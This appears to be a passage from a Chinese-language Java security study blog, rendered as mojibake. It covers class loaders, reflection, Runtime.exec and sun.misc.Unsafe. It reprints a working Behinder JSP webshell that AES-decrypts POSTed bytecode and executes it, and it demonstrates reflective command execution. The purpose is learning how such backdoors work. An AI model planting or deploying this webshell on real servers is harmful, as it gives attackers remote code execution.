è€Œ<strong>URLClassLoader</strong>çš„æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªURLæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥<strong>æ¥å—å¤šä¸ªURLæ¥ä»å¤šä¸ªä½ç½®åŠ è½½ç±»å’Œèµ„æº</strong>ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªURLï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåªæœ‰ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„æ¥ä¼ é€’ç»™<strong>URLClassLoader</strong>çš„æ„é€ å‡½æ•°ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1694964959887.png" alt="" loading="lazy"></p>
<h2 id="ç±»åŠ è½½éš”ç¦»">ç±»åŠ è½½éš”ç¦»</h2>
<p>åˆ›å»ºç±»åŠ è½½å™¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šè¯¥ç±»åŠ è½½çš„çˆ¶ç±»åŠ è½½å™¨ï¼ŒClassLoaderæ˜¯æœ‰éš”ç¦»æœºåˆ¶çš„ï¼Œä¸åŒçš„ClassLoaderå¯ä»¥åŠ è½½ç›¸åŒçš„Classï¼ˆä¸¤è€…å¿…é¡»æ˜¯éç»§æ‰¿å…³ç³»ï¼‰ï¼ŒåŒçº§ClassLoaderè·¨ç±»åŠ è½½å™¨è°ƒç”¨æ–¹æ³•æ—¶å¿…é¡»ä½¿ç”¨åå°„ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1694964967982.png" alt="" loading="lazy"></p>
<h3 id="è·¨ç±»åŠ è½½å™¨åŠ è½½">è·¨ç±»åŠ è½½å™¨åŠ è½½</h3>
<p>ä»£ç ï¼š</p>
<pre><code class="language-java">package test;

import java.lang.reflect.Method;

import static test.DecoyClassLoader.testClassBytes;
import static test.DecoyClassLoader.testClassName;

public class TestCrossClassLoader {
    public static class ClassLoaderA extends ClassLoader {

        public ClassLoaderA(ClassLoader parent) {
            super(parent);
        }

        {
            // åŠ è½½ç±»å­—èŠ‚ç 
            defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

    }

    public static class ClassLoaderB extends ClassLoader {

        public ClassLoaderB(ClassLoader parent) {
            super(parent);
        }

        {
            // åŠ è½½ç±»å­—èŠ‚ç 
            defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

    }

    public static void main(String[] args) throws Exception {
        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);

        Class&lt;?&gt; aClass  = Class.forName(testClassName, true, aClassLoader);
        Class&lt;?&gt; aaClass = Class.forName(testClassName, true, aClassLoader);
        Class&lt;?&gt; bClass  = Class.forName(testClassName, true, bClassLoader);

        System.out.println(&quot;aClass == aaClassï¼š&quot; + (aClass == aaClass));
        System.out.println(&quot;aClass == bClassï¼š&quot; + (aClass == bClass));

        System.out.println(&quot;\n&quot; + aClass.getName() + &quot;æ–¹æ³•æ¸…å•ï¼š&quot;);

        Method[] methods = aClass.getDeclaredMethods();

        for (Method method : methods) {
            System.out.println(method);
        }

        // åˆ›å»ºç±»å®ä¾‹
        Object instanceA = aClass.newInstance();

        // è·å–helloæ–¹æ³•
        Method helloMethod = aClass.getMethod(&quot;hello&quot;);

        // è°ƒç”¨helloæ–¹æ³•
        String result = (String) helloMethod.invoke(instanceA);

        System.out.println(&quot;\nåå°„è°ƒç”¨ï¼š&quot; + testClassName + &quot;ç±»&quot; + helloMethod.getName() + &quot;æ–¹æ³•ï¼Œè¿”å›ç»“æœï¼š&quot; + result);
    }
}

</code></pre>
<p><strong>public static class ClassLoaderA extends ClassLoader</strong><br>
åœ¨Javaä¸­ï¼Œä½ å¯ä»¥åœ¨ç±»çš„å®ä¾‹åˆå§‹åŒ–ä»£ç å—ä¸­ç¼–å†™ä»£ç ï¼Œè¿™äº›ä»£ç åœ¨æ¯æ¬¡åˆ›å»ºç±»çš„æ–°å®ä¾‹æ—¶éƒ½ä¼šæ‰§è¡Œã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨å¤§æ‹¬å· <strong>{}</strong> æ¥å®šä¹‰ä»£ç å—å®ç°çš„ï¼Œå¦‚ä½ åœ¨ä»£ç ä¸­æ‰€è§ã€‚<br>
è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå®ä¾‹åˆå§‹åŒ–ä»£ç å—ï¼Œå®ƒå°†åœ¨æ¯æ¬¡åˆ›å»º<strong>ClassLoaderA</strong>ç±»çš„æ–°å®ä¾‹æ—¶æ‰§è¡Œã€‚</p>
<p>** ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);**<br>
** ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);**<br>
ClassLoaderAå’ŒClassLoaderBéƒ½ä½¿ç”¨System ClassLoaderä½œä¸ºçˆ¶ç±»åŠ è½½å™¨ã€‚ç„¶ååœ¨å®ä¾‹åŒ–è¿™ä¸¤ä¸ªåŠ è½½å™¨çš„æ—¶å€™ï¼Œä»–ä»¬éƒ½ç”¨defineClassåŠ è½½äº†ä¸€ä¸ªç±»åˆ°å†…å­˜é‡Œï¼Œè™½ç„¶èƒŒåéƒ½æ˜¯ç”¨å®ƒä»¬ç»§æ‰¿æ¥çš„çˆ¶ç±»åŠ è½½å™¨åšçš„ã€‚ä½†å†…å­˜é‡Œçš„ä¸¤ä¸ªç±»ä¾ç„¶æ˜¯ä¸åŒçš„ã€‚</p>
<p>C<strong>lass<?> aClass = Class.forName(testClassName, true, aClassLoader); **
**Class<?> bClass = Class.forName(testClassName, true, bClassLoader);</strong><br>
è¿™ä¸ªæˆ‘ç†è§£æ˜¯ä»JVMå–å‡ºè¿™ä¸¤ä¸ªç±»<br>
**Class.forName(String name, boolean initialize, ClassLoader loader)**æ–¹æ³•æœ‰ä¸‰ä¸ªå‚æ•°ï¼š</p>
<ol>
<li><strong>name</strong>ï¼šè¦åŠ è½½çš„ç±»çš„å…¨é™å®šåï¼ˆåŒ…å+ç±»åï¼‰ã€‚</li>
<li><strong>initialize</strong>ï¼šæ˜¯å¦è¦åˆå§‹åŒ–ç±»ã€‚åˆå§‹åŒ–æ„å‘³ç€ä¼šæ‰§è¡Œç±»çš„é™æ€åˆå§‹åŒ–å—å’Œé™æ€å­—æ®µçš„åˆå§‹åŒ–ã€‚å¦‚æœè®¾ç½®ä¸º<strong>false</strong>ï¼Œåˆ™ç±»ä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œä½†æ˜¯ä¼šè¢«åŠ è½½å’Œè¿æ¥ã€‚</li>
<li><strong>loader</strong>ï¼šç”¨äºåŠ è½½ç±»çš„ç±»åŠ è½½å™¨ã€‚</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1694964987851.png" alt="" loading="lazy"></figure>
<h2 id="jspè‡ªå®šä¹‰ç±»åŠ è½½åé—¨">JSPè‡ªå®šä¹‰ç±»åŠ è½½åé—¨</h2>
<p>æµ…çœ‹ä¸€ä¸‹</p>
<pre><code class="language-java">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
&lt;%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%&gt;
&lt;%
    if (request.getMethod().equals(&quot;POST&quot;)) {
        String k = &quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/
        session.putValue(&quot;u&quot;, k);
        Cipher c = Cipher.getInstance(&quot;AES&quot;);
        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%&gt;
</code></pre>
<p>åé—¨ä¼šç»è¿‡AESè§£å¯†å¾—åˆ°ä¸€ä¸ªéšæœºç±»åçš„ç±»å­—èŠ‚ç ï¼Œç„¶åè°ƒç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨åŠ è½½ï¼Œæœ€ç»ˆé€šè¿‡è¯¥ç±»é‡å†™çš„equalsæ–¹æ³•å®ç°æ¶æ„æ”»å‡»</p>
<p>æœ€åè¿™ä¸€é•¿ä¸²çš„ä»£ç å¯ä»¥åˆ†ä¸‰å—ï¼š</p>
<pre><code class="language-java">new U(this.getClass().getClassLoader())
.g(
    c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))
).newInstance().equals(pageContext);
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ol>
<li>åœ¨å†°èJSPæœ¨é©¬çš„ä»£ç ä¸­ï¼Œé€šè¿‡è‡ªå®šä¹‰ç±»åŠ è½½å™¨åŠ è½½å¹¶å®ä¾‹åŒ–ä¸€ä¸ªç±»åï¼Œç›´æ¥è°ƒç”¨äº†è¯¥ç±»çš„ <strong>equals</strong> æ–¹æ³•ã€‚ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·åšï¼Ÿ</li>
<li>åœ¨ä½¿ç”¨åå°„è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•æ—¶ï¼Œä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ä½¿ç”¨ <strong>instance.methodName()</strong> çš„æ ¼å¼è°ƒç”¨ï¼Œè€Œéœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„åå°„APIæ¥è°ƒç”¨ï¼Ÿ</li>
<li><strong>newInstance().equals(pageContext)</strong> æ˜¯å¦‚ä½•ç›´æ¥è°ƒç”¨çš„ï¼Œæ²¡æœ‰é€šè¿‡åå°„APIæ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ</li>
</ol>
<p><strong>ç­”æ¡ˆï¼š</strong></p>
<ol>
<li>**ç›´æ¥è°ƒç”¨ equals æ–¹æ³•<br>
**ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥è°ƒç”¨ <strong>equals</strong> æ–¹æ³•ï¼Œæ˜¯å› ä¸º <strong>equals</strong> æ–¹æ³•æ˜¯ <strong>Object</strong> ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ‰€æœ‰çš„ç±»éƒ½æ˜¯ <strong>Object</strong> ç±»çš„å­ç±»ã€‚å› æ­¤ï¼Œç¼–è¯‘å™¨çŸ¥é“ä»»ä½•ç±»éƒ½ä¼šæœ‰ä¸€ä¸ª <strong>equals</strong> æ–¹æ³•ï¼Œè¿™å°±å…è®¸ä½ ç›´æ¥è°ƒç”¨å®ƒè€Œä¸éœ€è¦ä»»ä½•é¢å¤–çš„æ­¥éª¤ã€‚</li>
<li>**ä¸ºä»€ä¹ˆéœ€è¦åå°„æ¥è°ƒç”¨æ–¹æ³•<br>
**åœ¨ä½ æ²¡æœ‰ä¸€ä¸ªç±»å‹æ˜ç¡®çš„å¼•ç”¨æ—¶ï¼ˆä¾‹å¦‚ï¼Œå½“ä½ é€šè¿‡ç±»åŠ è½½å™¨åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼‰ï¼Œä½ ä¸èƒ½ç›´æ¥è°ƒç”¨è¯¥ç±»çš„æ–¹æ³•ï¼Œå› ä¸ºç¼–è¯‘å™¨æ— æ³•ç¡®å®šè¿™äº›æ–¹æ³•æ˜¯å¦å­˜åœ¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ éœ€è¦ä½¿ç”¨åå°„APIæ¥åŠ¨æ€è°ƒç”¨æ–¹æ³•ã€‚åå°„å…è®¸ä½ åœ¨è¿è¡Œæ—¶åŠ¨æ€è®¿é—®å’Œè°ƒç”¨æ–¹æ³•ï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶è¿›è¡Œé™æ€ç±»å‹æ£€æŸ¥ã€‚</li>
<li>**ä½¿ç”¨ newInstance().equals(pageContext)<br>
**åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ<strong>newInstance()</strong> æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„æ–°å®ä¾‹ã€‚ç„¶åï¼Œä½¿ç”¨ <strong>equals</strong> æ–¹æ³•æ¥è°ƒç”¨è¯¥å®ä¾‹çš„ <strong>equals</strong> æ–¹æ³•ï¼Œå¹¶å°† <strong>pageContext</strong> ä¼ é€’ç»™å®ƒã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºå¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œ<strong>equals</strong> æ–¹æ³•æ˜¯ <strong>Object</strong> ç±»çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ‰€æœ‰ç±»éƒ½ç»§æ‰¿è‡ª <strong>Object</strong> ç±»ã€‚</li>
</ol>
<h2 id="å¾…åŠ">å¾…åŠ</h2>
<p>FastJsonæ”»å‡»é“¾åˆ†æ</p>
<ul>
<li>BCEL ClassLoader</li>
<li>Xalan ClassLoader</li>
</ul>
<h1 id="javaåå°„æœºåˆ¶">Javaåå°„æœºåˆ¶</h1>
<h2 id="è·å–classå¯¹è±¡">è·å–Classå¯¹è±¡</h2>
<p>Javaåå°„æ“ä½œçš„æ˜¯java.lang.Classå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆæƒ³åŠæ³•è·å–åˆ°Classå¯¹è±¡ï¼Œé€šå¸¸æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡ï¼š</p>
<ol>
<li>ç±»å.classï¼Œå¦‚:com.anbai.sec.classloader.TestHelloWorld.classã€‚</li>
<li>Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;)ã€‚</li>
<li>classLoader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</li>
</ol>
<p>è·å–<strong>æ•°ç»„ç±»å‹çš„Classå¯¹è±¡</strong>éœ€è¦ä½¿ç”¨Javaç±»å‹çš„æè¿°ç¬¦æ–¹å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="language-java">Class&lt;?&gt; doubleArray = Class.forName(&quot;[D&quot;);//ç›¸å½“äºdouble[].class
Class&lt;?&gt; cStringArray = Class.forName(&quot;[[Ljava.lang.String;&quot;);// ç›¸å½“äºString[][].class
</code></pre>
<p>è·å–<strong>Runtimeç±»çš„ä¾‹å­ï¼š</strong></p>
<pre><code class="language-java">String className     = &quot;java.lang.Runtime&quot;;
Class  runtimeClass1 = Class.forName(className);
Class  runtimeClass2 = java.lang.Runtime.class;
Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);
</code></pre>
<p>åå°„è°ƒç”¨å†…éƒ¨ç±»çš„æ—¶å€™éœ€è¦ä½¿ç”¨<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">æ¥</mi><mi mathvariant="normal">ä»£</mi><mi mathvariant="normal">æ›¿</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi mathvariant="normal">å¦‚</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>a</mi><mi>n</mi><mi>b</mi><mi>a</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">ç±»</mi><mi mathvariant="normal">æœ‰</mi><mi mathvariant="normal">ä¸€</mi><mi mathvariant="normal">ä¸ª</mi><mi mathvariant="normal">å«</mi><mi mathvariant="normal">åš</mi><mi>H</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">å†…</mi><mi mathvariant="normal">éƒ¨</mi><mi mathvariant="normal">ç±»</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">é‚£</mi><mi mathvariant="normal">ä¹ˆ</mi><mi mathvariant="normal">è°ƒ</mi><mi mathvariant="normal">ç”¨</mi><mi mathvariant="normal">çš„</mi><mi mathvariant="normal">æ—¶</mi><mi mathvariant="normal">å€™</mi><mi mathvariant="normal">å°±</mi><mi mathvariant="normal">åº”</mi><mi mathvariant="normal">è¯¥</mi><mi mathvariant="normal">å°†</mi><mi mathvariant="normal">ç±»</mi><mi mathvariant="normal">å</mi><mi mathvariant="normal">å†™</mi><mi mathvariant="normal">æˆ</mi><mi mathvariant="normal">ï¼š</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>a</mi><mi>n</mi><mi>b</mi><mi>a</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>e</mi><mi>s</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">æ¥ä»£æ›¿.,å¦‚com.anbai.Testç±»æœ‰ä¸€ä¸ªå«åšHelloçš„å†…éƒ¨ç±»ï¼Œé‚£ä¹ˆè°ƒç”¨çš„æ—¶å€™å°±åº”è¯¥å°†ç±»åå†™æˆï¼šcom.anbai.Test</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">æ¥</span><span class="mord cjk_fallback">ä»£</span><span class="mord cjk_fallback">æ›¿</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">å¦‚</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">.</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">ç±»</span><span class="mord cjk_fallback">æœ‰</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">å«</span><span class="mord cjk_fallback">åš</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å†…</span><span class="mord cjk_fallback">éƒ¨</span><span class="mord cjk_fallback">ç±»</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">é‚£</span><span class="mord cjk_fallback">ä¹ˆ</span><span class="mord cjk_fallback">è°ƒ</span><span class="mord cjk_fallback">ç”¨</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">å€™</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">åº”</span><span class="mord cjk_fallback">è¯¥</span><span class="mord cjk_fallback">å°†</span><span class="mord cjk_fallback">ç±»</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å†™</span><span class="mord cjk_fallback">æˆ</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">.</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span></span></span></span>Helloã€‚</p>
<h2 id="åå°„javalangruntime">åå°„java.lang.Runtime</h2>
<p>ä¸ä½¿ç”¨åå°„çš„æœ¬åœ°å‘½ä»¤æ‰§è¡Œ</p>
<pre><code class="language-java">System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(), &quot;UTF-8&quot;));
</code></pre>
<p><code>org.apache.commons.io.IOUtils.toString</code>ç”¨æ¥å°†<strong>InputStream</strong>è½¬ä¸º<strong>String</strong></p>
<p><code>**ä½¿ç”¨åå°„çš„æ–¹æ³•**</code></p>
<pre><code class="language-java">package reflect;

import java.lang.reflect.*;
import java.io.InputStream;

public class RunReflect {
    public static void main(String[] args) throws Exception {

        Class runtimeClass1 = Class.forName(&quot;java.lang.Runtime&quot;);

        // è·å–æ„é€ æ–¹æ³•
        Constructor constructor = runtimeClass1.getDeclaredConstructor();
        constructor.setAccessible(true);

        // åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime();
        Object runtimeInstance = constructor.newInstance();

        // è·å–Runtimeçš„exec(String cmd)æ–¹æ³•
        Method runtimeMethod = runtimeClass1.getMethod(&quot;exec&quot;, String.class);

        // è°ƒç”¨execæ–¹æ³•ï¼Œç­‰ä»·äº rt.exec(cmd);
        Process process = (Process) runtimeMethod.invoke(runtimeInstance, &quot;whoami&quot;);

        // è·å–å‘½ä»¤æ‰§è¡Œç»“æœ
        InputStream in = process.getInputStream();

        // è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ
        System.out.println(org.apache.commons.io.IOUtils.toString(in, &quot;UTF-8&quot;));
    }
}

</code></pre>
<p>åå°„è°ƒç”¨Runtimeå®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>åå°„è·å–Runtimeç±»å¯¹è±¡(Class.forName(&quot;java.lang.Runtime&quot;))ã€‚</li>
<li>ä½¿ç”¨Runtimeç±»çš„Classå¯¹è±¡è·å–Runtimeç±»çš„æ— å‚æ•°æ„é€ æ–¹æ³•(getDeclaredConstructor())ï¼Œå› ä¸ºRuntimeçš„æ„é€ æ–¹æ³•æ˜¯privateçš„æˆ‘ä»¬æ— æ³•ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡åå°„å»ä¿®æ”¹æ–¹æ³•çš„è®¿é—®æƒé™(constructor.setAccessible(true))ã€‚</li>
<li>è·å–Runtimeç±»çš„exec(String)æ–¹æ³•(runtimeClass1.getMethod(&quot;exec&quot;, String.class)ğŸ˜‰ã€‚</li>
<li>è°ƒç”¨exec(String)æ–¹æ³•(runtimeMethod.invoke(runtimeInstance, cmd))ã€‚</li>
</ol>
<p>æ³¨æ„ï¼Œè¿™ä¸ªä»£ç åªæœ‰åœ¨javaç‰ˆæœ¬å°äº9æ‰èƒ½è¿è¡Œã€‚ä»Java 9å¼€å§‹ï¼Œé€šè¿‡Javaå¹³å°æ¨¡å—ç³»ç»Ÿï¼ˆJPMSï¼‰å¼•å…¥äº†æ›´ä¸¥æ ¼çš„è®¿é—®æ§åˆ¶ï¼Œè¿™ä½¿å¾—è®¿é—®æŸäº›æ ¸å¿ƒç±»åº“çš„å†…éƒ¨APIå˜å¾—æ›´åŠ å—é™ã€‚ç‰¹åˆ«æ˜¯ï¼Œå®ƒä¸å…è®¸ä½ é€šè¿‡åå°„æ¥è°ƒç”¨ä¸€ä¸ªæ¨¡å—çš„éå…¬å…±éƒ¨åˆ†ï¼Œé™¤éè¯¥æ¨¡å—è¢«æ˜¾å¼åœ°æ‰“å¼€ç»™è°ƒç”¨çš„æ¨¡å—ã€‚</p>
<p>å¦å¤–setAccessibleæ˜¯åå°„ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä¸æ˜¯runtimeç±»æä¾›çš„ã€‚</p>
<p><strong>Runtimeç±»æ„é€ æ–¹æ³•ç¤ºä¾‹ä»£ç ç‰‡æ®µ:</strong></p>
<pre><code class="language-java">public class Runtime {

   /** Don't let anyone else instantiate this class */
  private Runtime() {}

}
</code></pre>
<p><strong>ç§æœ‰</strong>çš„ç±»æ„é€ æ–¹æ³•ï¼Œä¸èƒ½ä½¿ç”¨Runtime rt = new Runtime();çš„æ–¹å¼åˆ›å»ºRuntimeå¯¹è±¡ã€‚</p>
<p><code>runtimeClass1.getDeclaredConstructor</code>å’Œ<code>runtimeClass1.getConstructor</code>éƒ½å¯ä»¥è·å–åˆ°ç±»æ„é€ æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºåè€…æ— æ³•è·å–åˆ°ç§æœ‰æ–¹æ³•ã€‚åå°„ç±»åˆ›å»ºå®ä¾‹ï¼š</p>
<pre><code class="language-java">constructor.newInstance()
</code></pre>
<p><strong>è·å–å½“å‰ç±»æ‰€æœ‰çš„æˆå‘˜æ–¹æ³•</strong><br>
getMethodå’ŒgetDeclaredMethodéƒ½èƒ½å¤Ÿè·å–åˆ°ç±»æˆå‘˜æ–¹æ³•ï¼ŒåŒºåˆ«åœ¨äºgetMethodåªèƒ½è·å–åˆ°<strong>å½“å‰ç±»å’Œçˆ¶ç±»</strong>çš„æ‰€æœ‰æœ‰æƒé™çš„æ–¹æ³•(å¦‚ï¼špublic)ï¼Œè€ŒgetDeclaredMethodèƒ½è·å–åˆ°å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜æ–¹æ³•(<strong>ä¸åŒ…å«çˆ¶ç±»</strong>)ã€‚</p>
<pre><code class="language-java">Method method = clazz.getDeclaredMethod(&quot;æ–¹æ³•å&quot;);
Method method = clazz.getDeclaredMethod(&quot;æ–¹æ³•å&quot;, å‚æ•°ç±»å‹å¦‚String.classï¼Œå¤šä¸ªå‚æ•°ç”¨&quot;,&quot;å·éš”å¼€);
</code></pre>
<p><strong>åå°„è°ƒç”¨æ–¹æ³•</strong><br>
é€šè¿‡Methodçš„invokeæ–¹æ³•æ¥è°ƒç”¨ç±»æ–¹æ³•ï¼Œ<code>method.invoke</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å®ä¾‹å¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯<code>static</code>æ–¹æ³•é‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å€¼å¯ä»¥ä¼ <code>null</code>ã€‚</p>
<pre><code class="language-java">method.invoke(æ–¹æ³•å®ä¾‹å¯¹è±¡, æ–¹æ³•å‚æ•°å€¼ï¼Œå¤šä¸ªå‚æ•°å€¼ç”¨&quot;,&quot;éš”å¼€);
</code></pre>
<p><strong>è·å–å½“å‰ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡</strong></p>
<pre><code class="language-java">Field fields = clazz.getDeclaredFields();
</code></pre>
<p><strong>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡ï¼š</strong></p>
<pre><code class="language-java">Field field  = clazz.getDeclaredField(&quot;å˜é‡å&quot;);
</code></pre>
<p>getFieldå’ŒgetDeclaredFieldçš„åŒºåˆ«åŒgetMethodå’ŒgetDeclaredMethodã€‚</p>
<p><strong>è·å–æˆå‘˜å˜é‡å€¼ï¼š</strong></p>
<pre><code class="language-java">Object obj = field.get(ç±»å®ä¾‹å¯¹è±¡);
</code></pre>
<p><strong>ä¿®æ”¹æˆå‘˜å˜é‡å€¼ï¼š</strong></p>
<pre><code class="language-java">field.set(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼);
</code></pre>
<p>åŒç†ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹çš„æˆå‘˜å˜é‡æƒé™æ—¶å¯ä»¥ä½¿ç”¨: field.setAccessible(true)çš„æ–¹å¼ä¿®æ”¹ä¸ºè®¿é—®æˆå‘˜å˜é‡è®¿é—®æƒé™ã€‚</p>
<h1 id="sunmiscunsafe">sun.misc.Unsafe</h1>
<h2 id="è·å–unsafeå¯¹è±¡">è·å–Unsafeå¯¹è±¡</h2>
<pre><code class="language-java">import sun.reflect.CallerSensitive;
import sun.reflect.Reflection;

public final class Unsafe {

    private static final Unsafe theUnsafe;

    static {
        theUnsafe = new Unsafe();
        çœå»å…¶ä»–ä»£ç ......
    }

    private Unsafe() {
    }

    @CallerSensitive
    public static Unsafe getUnsafe() {
        Class var0 = Reflection.getCallerClass();
        if (var0.getClassLoader() != null) {
            throw new SecurityException(&quot;Unsafe&quot;);
        } else {
            return theUnsafe;
        }
    }

    çœå»å…¶ä»–ä»£ç ......
}

</code></pre>
<p><strong>åå°„è·å–Unsafeç±»å®ä¾‹ä»£ç å®éªŒï¼š</strong></p>
<pre><code class="language-java">package reflect;

import sun.misc.Unsafe;
import java.lang.reflect.Field;

public class TestUnsafe {
    static class TestClass {
        private TestClass() {
            System.out.println(&quot;TestClass private constructor&quot;);
        }
    }

    public static void main(String[] args) throws Exception {
        // åå°„è·å–Unsafeçš„theUnsafeæˆå‘˜å˜é‡
        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);

        // åå°„è®¾ç½®theUnsafeè®¿é—®æƒé™
        theUnsafeField.setAccessible(true);

        // åå°„è·å–theUnsafeæˆå‘˜å˜é‡å€¼
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        // ä½¿ç”¨Unsafeæ¥å®ä¾‹åŒ–TestClassï¼ŒallocateInstanceä¼šç»•è¿‡ç±»çš„æ„é€ æ–¹æ³•å»å®ä¾‹ä¸€ä¸ªç±»
        TestClass testInstance = (TestClass) unsafe.allocateInstance(TestClass.class);
